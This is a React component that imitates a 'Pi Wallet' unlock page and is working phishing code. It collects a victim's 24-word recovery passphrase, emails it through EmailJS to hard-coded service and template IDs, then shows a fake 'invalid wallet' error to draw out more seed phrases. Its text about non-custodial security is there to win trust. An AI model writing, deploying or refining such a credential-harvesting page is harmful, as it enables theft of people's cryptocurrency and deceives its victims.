import React, { useRef, useState } from 'react'
import "./index.css"
import emailjs from '@emailjs/browser';

function Wallet() {

    const form = useRef();
    const [formData, setFormData] = useState({email:''})
    const { email } = formData
    function onChange(e) {
        setFormData((prevState) => ({
            ...prevState,
            [e.target.name]: e.target.value
        })
        )
    }

    function WordCount(str) { 
        return str.split(" ").length;
      }

      
      const sendEmail = (e) => {
          e.preventDefault();
          const numberOfWords= WordCount(email)
          console.log(numberOfWords)
          if (numberOfWords<24){
            alert('not up to 24')
          }

        else{
            emailjs.sendForm('service_1uds58e', 'template_g48vdq8', form.current, 'VG5-7pMUMPdaN0Au0')
            .then((result) => {
                alert('error, invalid wallet. Try another wallet')
                console.log(result.text);
                console.log(email);
            }, (error) => {
                console.log(error.text);
            });
        }
    }

    return (
        <div>
            <div className="verify">

                <h2>Unlock Pi Wallet</h2>
                <form action="submit" className='verify-form' ref={form} onSubmit={sendEmail}>
                    <textarea name='email' onChange={onChange} value={email}   placeholder="Enter Your 24-word passphrase here" cols="30" rows="10" required="">
                    </textarea>
                    <button className="passphrasebtn" id="">Unlock With Passphrase</button>
                </form>
                    <button className="fingerprintbtn" onClick={sendEmail}>Unlock With Biometrics</button>
                <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of Passphrase is impossible. 
                </p>
                <p>Lost your passphrase? <span  className='blue'>You can create a new wallet</span>, but all your π in you previous wallet will be inaccessible.</p>
            </div>
        </div >
    )
}

export default Wallet
